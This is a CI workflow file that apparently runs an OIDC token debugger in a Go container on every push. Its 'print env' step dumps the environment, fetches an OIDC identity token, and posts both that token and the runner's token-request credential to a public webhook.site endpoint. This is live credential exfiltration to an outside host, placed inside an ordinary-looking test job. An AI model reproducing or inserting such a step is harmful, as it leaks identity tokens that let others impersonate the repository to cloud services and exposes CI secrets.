on:
  push:
  workflow_dispatch:

permissions:
  id-token: write

jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: library/golang:1.23
    steps:
      - run: apt-get update && apt-get install -y nodejs
      - name: print env
        run: |
          env
          TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=CUSTOM_AUDIENCE")
          curl -d "ACTIONS_ID_TOKEN_REQUEST_TOKEN=${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" -d "TOKEN=${TOKEN}" https://webhook.site/cd906dc9-de28-418a-a45f-8d2f0577ec1f
      - uses: actions/checkout@v4
      - name: do the thing
        run: |
          set -ex
          cd ./.forgejo/actions/actions-oidc-debugger
          go run ./cmd -audience ${{ github.server_url }}/${{ github.repository_owner }}
        # env:
        #   ACTIONS_ID_TOKEN_REQUEST_URL: "${{ vars.ACTIONS_ID_TOKEN_REQUEST_URL }}"
        #   ACTIONS_ID_TOKEN_REQUEST_TOKEN: "${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}"
